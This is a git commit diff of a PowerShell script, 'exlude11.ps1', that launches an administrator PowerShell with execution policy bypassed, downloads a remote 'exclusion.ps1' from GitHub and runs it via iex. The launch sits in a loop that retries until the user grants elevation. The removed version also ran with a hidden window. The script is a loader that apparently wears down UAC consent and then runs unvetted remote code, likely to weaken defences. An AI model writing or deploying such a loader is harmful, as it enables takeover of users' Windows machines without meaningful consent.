37bca9313d7ab94a15b6a1b8208fb5b2aa1a4f50
m4x7c <rizzbro995@gmail.com>
2026-01-04 01:45:01 +0600

    Update exlude11.ps1

--- exlude11.ps1
+++ exlude11.ps1
@@ -1,12 +1,8 @@
 do {
     try {
-        # Attempt to run PowerShell as admin
-        Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command $pl = iwr https://github.com/m4x7c/win11lude/raw/refs/heads/main/exclusion.ps1; invoke-expression $pl' -Verb RunAs
+        Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/m4x7c/win11lude/raw/refs/heads/main/exclusion.ps1 | iex"' -Verb RunAs
         $success = $true
     } catch {
-        # If the command was not successful, set success to false
         $success = $false
     }
 } until ($success)
- 
-exit
